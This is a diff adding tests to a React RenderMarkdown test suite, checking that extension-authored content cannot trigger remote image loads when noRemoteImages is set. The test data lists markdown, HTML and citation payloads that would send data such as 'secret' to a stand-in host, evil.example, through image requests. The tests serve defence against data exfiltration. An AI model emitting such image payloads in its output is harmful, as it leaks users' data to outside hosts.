@@ -738,5 +738,58 @@ describe('RenderMarkdown', () => {
       expect(openExternalUrl).not.toHaveBeenCalled()
     })
   })
-})
 
+  // Content an extension authored (an appended message, its provider's reply)
+  // must not make the app contact a host: the app CSP allows any https image.
+  describe('noRemoteImages', () => {
+    const remote = [
+      '![pixel](https://evil.example/p?d=secret)',
+      '![pixel](http://evil.example/p)',
+      '![pixel](//evil.example/p)',
+      '[![pixel](https://evil.example/p)](https://example.com)',
+      '<img src="https://evil.example/p">',
+      '[cite](#webcite-https%3A%2F%2Fevil.example%2Fsecret)',
+      'Fact.[[cite:https://evil.example/secret]]',
+    ]
+
+    it.each(remote)('renders %s without loading anything', (content) => {
+      for (const isStreaming of [false, true]) {
+        const { container, unmount } = render(
+          <RenderMarkdown
+            content={content}
+            isStreaming={isStreaming}
+            noRemoteImages
+          />
+        )
+        expect(container.querySelector('img')).toBeNull()
+        unmount()
+      }
+    })
+
+    it('keeps the alt text of a blocked image', () => {
+      const { container } = render(
+        <RenderMarkdown content={'![a chart](https://x.example/c.png)'} noRemoteImages />
+      )
+      expect(container).toHaveTextContent('a chart')
+    })
+
+    it('still renders an inline data image', () => {
+      const { container } = render(
+        <RenderMarkdown
+          content={'![dot](data:image/png;base64,iVBORw0KGgo=)'}
+          noRemoteImages
+        />
+      )
+      expect(container.querySelector('img')?.getAttribute('src')).toMatch(
+        /^data:image\/png/
+      )
+    })
+
+    it('loads remote images when the content is not extension-authored', () => {
+      const { container } = render(
+        <RenderMarkdown content={'![pixel](https://example.com/p.png)'} />
+      )
+      expect(container.querySelector('img')).toBeTruthy()
+    })
+  })
+})
